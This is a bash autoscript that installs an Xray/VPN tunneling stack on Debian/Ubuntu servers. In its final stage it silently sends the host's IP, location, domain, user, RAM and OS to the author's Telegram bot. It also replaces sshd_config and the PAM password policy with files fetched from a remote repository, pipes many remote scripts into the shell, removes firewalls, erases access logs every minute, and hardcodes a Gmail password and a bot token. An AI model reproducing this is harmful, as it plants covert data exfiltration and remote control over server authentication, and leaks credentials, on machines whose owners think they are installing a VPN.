#!/bin/bash
# //====================================================
# //	System Request:Debian 9+/Ubuntu 18.04+/20+
# //	Author:	bhoikfostyahya
# //	Dscription: Xray Menu Management
# //	email: admin@bhoikfostyahya.com
# //  telegram: https://t.me/bhoikfost_yahya
# //====================================================

# // FONT color configuration | BHOIKFOST YAHYA AUTOSCRIPT
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'

# // configuration GET | BHOIKFOST YAHYA AUTOSCRIPT
TIMES="10"
NAMES=$(whoami)
IMP="wget -q -O"
CHATID="1118232400"
LOCAL_DATE="/usr/bin/"
MYIP=$(wget -qO- ipinfo.io/ip)
CITY=$(curl -s ipinfo.io/city)
TIME=$(date +'%Y-%m-%d %H:%M:%S')
RAMMS=$(free -m | awk 'NR==2 {print $2}')
KEY="5661986467:AAHRhgKFp9N5061gZtZ6n4Ae4BJF3PmQ188"
URL="https://api.telegram.org/bot$KEY/sendMessage"
GITHUB_CMD="https://github.com/rullpqh/Autoscript-vps/raw/"
OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')

secs_to_human() {
    echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
}

start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime >/dev/null 2>&1
function print_ok() {
    echo -e "${OK} ${BLUE} $1 ${FONT}"
}

function print_error() {
    echo -e "${ERROR} ${REDBG} $1 ${FONT}"
}

function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "Root user Start installation process"
    else
        print_error "The current user is not the root user, please switch to the root user and run the script again"
    fi

}

judge() {
    if [[ 0 -eq $? ]]; then
        print_ok "$1 Complete... | thx to ${YELLOW}bhoikfostyahya${FONT}"
        sleep 1
    fi
}

function nginx_install() {
    # // Checking System
    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
        judge "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        # // sudo add-apt-repository ppa:nginx/stable -y >/dev/null 2>&1
        sudo apt-get update -y >/dev/null 2>&1
        sudo apt-get install nginx -y >/dev/null 2>&1
	sudo apt-get install haproxy -y >/dev/null 2>&1
    elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
        judge "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        sudo apt update >/dev/null 2>&1
        apt -y install nginx >/dev/null 2>&1
	sudo apt-get install haproxy -y >/dev/null 2>&1
    else
        judge "${ERROR} Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
        # // exit 1
    fi

}

function LOGO() {
    echo -e "
    ┌───────────────────────────────────────────────┐
 ───│                                               │───
 ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───
 ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───
 ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───
    │    ${YELLOW}Copyright${FONT} (C)$GRAY https://github.com/rullpqh$NC   │
    └───────────────────────────────────────────────┘
         ${RED}Autoscript xray vpn lite (multi port)${FONT}    
           ${RED}no licence script (free lifetime) ${FONT}
${RED}Make sure the internet is smooth when installing the script${FONT}
        "

}
function install_xray() {
    judge "Core Xray 1.6.5 Version installed successfully"
    curl -s ipinfo.io/city >>/etc/xray/city
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
    bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 1.6.5 >/dev/null 2>&1
    curl https://rclone.org/install.sh | bash >/dev/null 2>&1
    printf "q\n" | rclone config >/dev/null 2>&1
    wget -O /root/.config/rclone/rclone.conf "${GITHUB_CMD}main/RCLONE%2BBACKUP-Gdrive/rclone.conf" >/dev/null 2>&1
    wget -O /etc/xray/config.json "${GITHUB_CMD}main/VMess-VLESS-Trojan%2BWebsocket%2BgRPC/config.json" >/dev/null 2>&1
    wget -O /usr/bin/ws "${GITHUB_CMD}main/fodder/websocket/ws" >/dev/null 2>&1
    wget -O /usr/bin/tun.conf "${GITHUB_CMD}main/fodder/websocket/tun.conf" >/dev/null 2>&1
    wget -O /etc/systemd/system/ws.service "${GITHUB_CMD}main/fodder/websocket/ws.service" >/dev/null 2>&1
    wget -q -O /lib/systemd/system/sslh.service "${GITHUB_CMD}main/fodder/bhoikfostyahya/sslh.service" >/dev/null 2>&1
    wget -q -O /etc/ipserver "${GITHUB_CMD}main/fodder/FighterTunnel-examples/ipserver" && bash /etc/ipserver >/dev/null 2>&1
    chmod +x /etc/systemd/system/ws.service >/dev/null 2>&1
    chmod +x /usr/bin/ws >/dev/null 2>&1
    chmod 644 /usr/bin/tun.conf >/dev/null 2>&1
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable ws.service >/dev/null 2>&1
    systemctl restart ws.service >/dev/null 2>&1
    systemctl disable sslh >/dev/null 2>&1
    systemctl stop sslh >/dev/null 2>&1
    systemctl enable sslh >/dev/null 2>&1
    systemctl start sslh >/dev/null 2>&1

    cat >/etc/msmtprc <<EOF
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user fitamirgana@gmail.com
from fitamirgana@gmail.com
password obfvhzpomhbqrunm
logfile ~/.msmtp.log

EOF

    rm -rf /etc/systemd/system/xray.service.d
    cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com/xtls
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF

}
function download_config() {
    cd
    rm -rf *
    wget -O /etc/haproxy/haproxy.cfg "${GITHUB_CMD}main/fodder/FighterTunnel-examples/Haproxy" >/dev/null 2>&1
    wget ${GITHUB_CMD}main/fodder/XrayFT.zip >>/dev/null 2>&1
    7z e -pKarawang123@bhoikfostyahya XrayFT.zip >>/dev/null 2>&1
    rm -f XrayFT.zip
    mv nginx.conf /etc/nginx/
    mv xray.conf /etc/nginx/conf.d/
    chmod +x *
    mv * /usr/bin/

    cat >/root/.profile <<END
# ~/.profile: executed by Bourne-compatible login shells.
if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
mesg n || true
menu
END

    cat >/etc/cron.d/xp_all <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		2 0 * * * root /usr/bin/xp
	END
    chmod 644 /root/.profile

    cat >/etc/cron.d/daily_reboot <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		0 5 * * * root /sbin/reboot
	END

    cat >/usr/bin/service.restart <<-END
		service nginx restart >/dev/null 2>&1
		service xray restart >/dev/null 2>&1 
		systemctl restart limitvmess >/dev/null 2>&1 
		systemctl restart limitvless >/dev/null 2>&1 
		systemctl restart limittrojan >/dev/null 2>&1 
		systemctl restart limitshadowsocks >/dev/null 2>&1 
	END

    chmod +x /usr/bin/service.restart
    cat >/etc/cron.d/service <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		*/59 * * * * root /usr/bin/service.restart
	END

    echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
    echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
    service cron restart
    cat >/home/daily_reboot <<-END
		5
	END

    cat >/etc/systemd/system/rc-local.service <<-END
		[Unit]
		Description=/etc/rc.local
		ConditionPathExists=/etc/rc.local
		[Service]
		Type=forking
		ExecStart=/etc/rc.local start
		TimeoutSec=0
		StandardOutput=tty
		RemainAfterExit=yes
		SysVStartPriority=99
		[Install]
		WantedBy=multi-user.target
	END

    echo "/bin/false" >>/etc/shells
    echo "/usr/sbin/nologin" >>/etc/shells
    cat >/etc/rc.local <<-END
		#!/bin/sh -e
		# rc.local
		# By default this script does nothing.
		iptables -I INPUT -p udp --dport 5300 -j ACCEPT
		iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
		exit 0
	END
    chmod +x /etc/rc.local

    judge "installed stunnel"
    apt-get install stunnel4 -y >/dev/null 2>&1
    cat >/etc/stunnel/stunnel.conf <<-END
		cert = /etc/xray/xray.crt
		key = /etc/xray/xray.key
		client = no
		socket = a:SO_REUSEADDR=1
		socket = l:TCP_NODELAY=1
		socket = r:TCP_NODELAY=1

		[dropbear-ssl]
		accept = 441
		connect = 127.0.0.1:10011

		[openvpn-ssl]
		accept = 442
		connect = 127.0.0.1:10012

		[openssh-ssl]
		accept = 444
		connect = 127.0.0.1:22
		
		[no-haproxy]
		accept = 445
		connect = 127.0.0.1:1194
		END

    apt install squid -y >/dev/null 2>&1
    wget -q -O /etc/squid/squid.conf "${GITHUB_CMD}main/fodder/FighterTunnel-examples/squid.conf"
    wget -q -O /etc/default/dropbear "${GITHUB_CMD}main/fodder/FighterTunnel-examples/dropbear" >/dev/null 2>&1
    wget -q -O /etc/ssh/sshd_config "${GITHUB_CMD}main/fodder/FighterTunnel-examples/sshd_config" >/dev/null 2>&1
    wget -q -O /etc/fightertunnel.txt "${GITHUB_CMD}main/fodder/FighterTunnel-examples/banner" >/dev/null 2>&1
    AUTOREB=$(cat /home/daily_reboot)
    SETT=11
    if [ $AUTOREB -gt $SETT ]; then
        TIME_DATE="PM"
    else
        TIME_DATE="AM"
    fi
}

function acme() {
    judge "installed successfully SSL certificate generation script"
    rm -rf /root/.acme.sh >/dev/null 2>&1
    mkdir /root/.acme.sh >/dev/null 2>&1
    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh >/dev/null 2>&1
    chmod +x /root/.acme.sh/acme.sh >/dev/null 2>&1
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade >/dev/null 2>&1
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt >/dev/null 2>&1
    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256 >/dev/null 2>&1
    ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc >/dev/null 2>&1
    judge "Installed slowdns"
    wget -q -O /etc/nameserver "${GITHUB_CMD}main/X-SlowDNS/nameserver" && bash /etc/nameserver >/dev/null 2>&1

}

function configure_nginx() {
    # // nginx config | BHOIKFOST YAHYA AUTOSCRIPT
    cd
    
    rm /var/www/html/*.html
    rm /etc/nginx/sites-enabled/default
    rm /etc/nginx/sites-available/default
    wget ${GITHUB_CMD}main/fodder/web.zip >>/dev/null 2>&1
    unzip -x web.zip >>/dev/null 2>&1
    rm -f web.zip
    mv * /var/www/html/
    judge "Nginx configuration modification"
}
function restart_system() {
    TEXT="
<u>INFORMASI VPS INSTALL SC</u>
TIME     : <code>${TIME}</code>
IPVPS     : <code>${MYIP}</code>
DOMAIN   : <code>${domain}</code>
IP VPS       : <code>${MYIP}</code>
LOKASI       : <code>${CITY}</code>
USER         : <code>${NAMES}</code>
RAM          : <code>${RAMMS}MB</code>
LINUX       : <code>${OS}</code>
"
    curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
    sed -i "s/xxx/${domain}/g" /var/www/html/index.html >/dev/null 2>&1
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf >/dev/null 2>&1
    sed -i "s/xxx/${MYIP}/g" /etc/squid/squid.conf >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/get-backres >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/add-ssh >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/cek-ssh >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/renew-ssh >/dev/null 2>&1
    sed -i -e 's/\r$//' /usr/bin/del-ssh >/dev/null 2>&1
    chown -R www-data:www-data /etc/msmtprc >/dev/null 2>&1
    source <(curl -sL ${GITHUB_CMD}main/fodder/FighterTunnel-examples/Documentation/tunlp) >/dev/null 2>&1
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable client >/dev/null 2>&1
    systemctl enable server >/dev/null 2>&1
    systemctl start client >/dev/null 2>&1
    systemctl start server >/dev/null 2>&1
    systemctl restart nginx >/dev/null 2>&1
    systemctl restart xray >/dev/null 2>&1
    systemctl restart rc-local >/dev/null 2>&1
    systemctl restart client >/dev/null 2>&1
    systemctl restart server >/dev/null 2>&1
    systemctl restart ssh >/dev/null 2>&1
    systemctl restart stunnel4 >/dev/null 2>&1
    systemctl restart sslh >/dev/null 2>&1
    systemctl restart dropbear >/dev/null 2>&1
    systemctl restart squid >/dev/null 2>&1
    systemctl restart ws >/dev/null 2>&1
    systemctl restart openvpn >/dev/null 2>&1
    systemctl restart cron >/dev/null 2>&1
    systemctl restart haproxy >/dev/null 2>&1
    clear
    LOGO
    echo "    ┌───────────────────────────────────────────────────────┐"
    echo "    │       >>> Service & Port                              │"
    echo "    │   - XRAY  Vmess TLS         : 443                     │"
    echo "    │   - XRAY  Vmess gRPC        : 443                     │"
    echo "    │   - XRAY  Vmess None TLS    : 80                      │"
    echo "    │   - XRAY  Vless TLS         : 443                     │"
    echo "    │   - XRAY  Vless gRPC        : 443                     │"
    echo "    │   - XRAY  Vless None TLS    : 80                      │"
    echo "    │   - Trojan gRPC             : 443                     │"
    echo "    │   - Trojan WS               : 443                     │"
    echo "    │   - Shadowsocks WS          : 443                     │"
    echo "    │   - Shadowsocks gRPC        : 443                     │"
    echo "    │                                                       │"
    echo "    │      >>> Server Information & Other Features          │"
    echo "    │   - Timezone                : Asia/Jakarta (GMT +7)   │"
    echo "    │   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7          │"
    echo "    │   - Auto Delete Expired Account                       │"
    echo "    │   - Fully automatic script                            │"
    echo "    │   - VPS settings                                      │"
    echo "    │   - Admin Control                                     │"
    echo "    │   - Restore Data                                      │"
    echo "    │   - Full Orders For Various Services                  │"
    echo "    └───────────────────────────────────────────────────────┘"
    secs_to_human "$(($(date +%s) - ${start}))"
    echo -ne "         ${YELLOW}Please Reboot Your Vps${FONT} (y/n)? "
    read REDDIR
    if [ "$REDDIR" == "${REDDIR#[Yy]}" ]; then
        exit 0
    else
        reboot
    fi

}
function make_folder_xray() {
    # // Make Folder Xray to accsess
    mkdir -p /etc/xray
    mkdir -p /var/log/xray
    chmod +x /var/log/xray
    touch /etc/xray/domain
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
}

function dependency_install() {
    INS="apt-get install -y"
    echo ""
    echo "Please wait to install Package..."
    apt-get update >/dev/null 2>&1
    judge "Update configuration"

    ${INS} jq zip unzip p7zip-full >/dev/null 2>&1
    apt-get install debconf-utils -y >/dev/null 2>&1
    apt-get install -y --no-install-recommends software-properties-common -y >/dev/null 2>&1
    judge "Installed successfully jq zip unzip"

    ${INS} make curl socat systemd libpcre3 libpcre3-dev zlib1g-dev openssl libssl-dev >/dev/null 2>&1
    judge "Installed curl socat systemd"
    apt-get install golang -y >/dev/null 2>&1
    ${INS} net-tools cron htop lsof tar -y >/dev/null 2>&1
    judge "Installed net-tools"

    judge "Installed openvpn easy-rsa"
    source <(curl -sL ${GITHUB_CMD}main/BadVPN-UDPWG/ins-badvpn) >/dev/null 2>&1
    apt-get install -y openvpn easy-rsa >/dev/null 2>&1

    judge "Installed msmtp-mta ca-certificates"
    apt-get install msmtp-mta ca-certificates bsd-mailx -y >/dev/null 2>&1

    judge "Installed sslh"
    wget -O /etc/pam.d/common-password "${GITHUB_CMD}main/fodder/FighterTunnel-examples/common-password" >/dev/null 2>&1
    chmod +x /etc/pam.d/common-password
    source <(curl -sL ${GITHUB_CMD}main/fodder/bhoikfostyahya/installer_sslh) >/dev/null 2>&1
    source <(curl -sL ${GITHUB_CMD}main/fodder/openvpn/openvpn) >/dev/null 2>&1
    apt-get purge apache2 -y >/dev/null 2>&1
    apt-get clean all >/dev/null 2>&1
    apt-get autoremove -y >/dev/null 2>&1
    sudo apt-get remove --purge ufw firewalld -y >/dev/null 2>&1
    sudo apt-get remove --purge exim4 -y >/dev/null 2>&1
    judge "Clean configuration"
    DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration >/dev/null 2>&1
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
    judge "Installed dropbear"
    apt-get install dropbear -y >/dev/null 2>&1

}

function install_sc() {
    dependency_install
    acme
    nginx_install
    configure_nginx
    download_config
    install_xray
    restart_system
}
function add_domain() {
    read -p "Input Domain :  " domain
    echo $domain >/etc/xray/domain
	
}
# // Prevent the default bin directory of some system xray from missing 

fun_bar() {
    comando[0]="$1"
    comando[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${comando[0]} -y >/dev/null 2>&1
        ${comando[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[1;33mPlease Wait Upgrade UR VPS \033[1;37m- \033[1;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[1;31m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[1;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[1;33mPlease Wait Upgrade UR VPS \033[1;37m- \033[1;33m["
    done
    echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
    tput cnorm
}
clear
echo -e "\033[1;31m════════════════════════════════════════════════════\033[0m"
tput setaf 7
tput setab 4
tput bold
printf '%40s%s%-12s\n' "Update Repositories"
tput sgr0
echo -e "\033[1;31m════════════════════════════════════════════════════\033[0m"
echo -e ""
echo -e "      This script will do the installation"
echo -e "        manager for VPN connection mode."
echo -e ""
echo -e "      \033[1;33mInstaller Autoscript Ubuntu/Debian \033[1;37m"
echo -e "\033[1;31m════════════════════════════════════════════════════\033[0m"
echo ""
echo -e "DOWLOADING DEPENDENCIES..."
echo ""

fun_fightertunnel() {
    apt-get update -y
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    apt-get install -y wget curl ruby zip unzip iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony
    sudo apt install -y libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev xl2tpd pptpd
    apt-get install -y --no-install-recommends software-properties-common
    apt-get install libc6 util-linux build-essential -y
    apt-get install python3-pip -y
    apt autoremove -y
}
fun_bar 'fun_fightertunnel'
clear
LOGO
echo -e "${RED}JANGAN INSTALL SCRIPT INI MENGGUNAKAN KONEKSI VPN!!!${FONT}"
echo -e ""
echo -e "${Green}DNS POINTING${FONT}(DNS-resolved IP address of the domain)"
echo ""
read -p "Lanjutkan untuk menginstall y/n " menu_num

case $menu_num in
y)
    make_folder_xray
    add_domain
    install_sc
    ;;
*)
    echo -e "${RED}You wrong command !${FONT}"
    ;;
esac
